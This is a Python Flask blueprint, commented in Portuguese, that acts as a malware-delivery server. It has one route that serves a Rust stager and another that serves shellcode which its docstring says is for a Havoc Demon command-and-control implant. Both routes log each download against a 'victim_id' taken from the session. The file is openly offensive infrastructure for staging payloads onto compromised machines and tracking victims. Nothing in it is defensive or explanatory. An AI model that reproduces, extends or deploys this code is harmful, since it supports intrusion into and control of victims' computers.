from flask import Blueprint, send_file, abort, current_app, session
from app.utils.logging import log_event
import os

main_bp = Blueprint('main', __name__)


@main_bp.route('/get_rusta')
def get_rusta():
    """Entrega o Rust Stager"""
    victim_id = session.get("victim_id", "unknown")
    log_event("RUST STAGER BAIXADO", victim_id=victim_id, level="INFO")

    payload = current_app.config['PAYLOADS'].get("rust")
    if not payload:
        abort(404)

    caminho = os.path.join(current_app.config['PAYLOADS_DIR'], payload["file"])
    if not os.path.exists(caminho):
        abort(404)

    return send_file(
        caminho,
        as_attachment=True,
        download_name=payload["name"]
    )


@main_bp.route('/get_sc')
def get_sc():
    """Entrega o Shellcode (para uso com Havoc Demon)"""
    victim_id = session.get("victim_id", "unknown")
    log_event("SHELLCODE BAIXADO", victim_id=victim_id, level="INFO")

    payload = current_app.config['PAYLOADS'].get("sc")
    if not payload:
        abort(404)

    caminho = os.path.join(current_app.config['PAYLOADS_DIR'], payload["file"])
    if not os.path.exists(caminho):
        abort(404)

    return send_file(
        caminho,
        mimetype="application/octet-stream"
    )